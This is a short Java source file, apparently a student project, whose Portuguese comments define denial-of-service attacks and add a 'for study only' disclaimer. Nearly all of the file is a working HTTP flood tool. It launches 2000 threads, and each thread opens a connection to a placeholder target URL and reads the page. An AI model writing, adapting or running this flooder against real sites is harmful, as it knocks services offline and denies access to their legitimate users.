/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

/*Na computação , um ataque de negação de serviço ( ataque DoS ) é um ataque 
cibernético onde o perpetrador procura tornar uma máquina ou recurso de rede 
indisponível para seus usuários intencionados, interrompendo temporariamente 
ou indefinidamente serviços de um host conectado à Internet . A negação de 
serviço normalmente é realizada inundando a máquina ou o recurso segmentado 
com solicitações supérfluas na tentativa de sobrecarregar os sistemas e 
impedir que alguns ou todos os pedidos legítimos sejam cumpridos. Um ataque
DoS é análogo a um grupo de pessoas aglomerando a porta de entrada ou porta 
para uma loja ou negócio, e não deixar partes legítimas entrar na loja ou 
negócio, interrompendo operações normais.*/


//APP PARA FINS DE ESTUDO, NÃO FAÇA MAL USO DO MESMO. OBRIGADO!

package attackdos;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;
import java.net.URLConnection;

/**
 * @author Diovane Soligo
 */
public class AttackDOS {

    static class EvilConnected implements Runnable{

        @Override
        public void run() {
            String stringURL = "http://www.NomeDoSite.com.br/";//URL do site a ser atacado
            String answer = "";
            try {
                URL url = new URL(stringURL);
                URLConnection connection = url.openConnection();

                BufferedReader in = new BufferedReader(
                        new InputStreamReader(
                        connection.getInputStream()));

                String inputLine;
                StringBuffer sb = new StringBuffer();

                while ((inputLine = in.readLine()) != null) sb.append(inputLine);
                answer = sb.toString();

                System.out.println("--> "+answer);

                in.close();
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    }

    public static void main(String[] args) { 
        int i = 0;
        
        while(i<2000){ //quantidade de conexões simultaneas
            System.out.println("ATACK ação: "+i);
            EvilConnected attack = new EvilConnected();
            new Thread (attack).start();
            i++;
        } 
    }
}
